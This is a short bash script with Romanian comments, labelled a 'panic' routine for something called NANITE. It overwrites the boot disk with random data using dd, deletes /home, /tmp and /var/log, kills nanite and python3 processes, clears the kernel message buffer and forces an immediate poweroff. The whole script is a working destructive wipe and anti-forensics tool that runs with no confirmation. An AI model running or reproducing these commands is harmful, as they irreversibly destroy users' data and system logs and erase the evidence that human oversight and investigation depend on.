#!/bin/bash
# NANITE: PANIC v2 - CEL MAI RAPID POSIBIL
# Zero delay. Zero notificare. Zero asteptare.
# Totul in paralel, poweroff in 3 secunde.

BOOT_DEV=$(findmnt -n -o SOURCE / 2>/dev/null | sed 's/[0-9]*$//' | sed 's/p[0-9]*$//')

# TOTUL IN PARALEL
[ -b "$BOOT_DEV" ] && dd if=/dev/urandom of="$BOOT_DEV" bs=4M status=none 2>/dev/null &
rm -rf /tmp/* /home/* /var/log/* 2>/dev/null &
pkill -9 -f nanite 2>/dev/null &
pkill -9 -f python3 2>/dev/null &
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
dmesg -C 2>/dev/null

# 3 secunde si gata
sleep 3
echo o > /proc/sysrq-trigger 2>/dev/null || poweroff -f
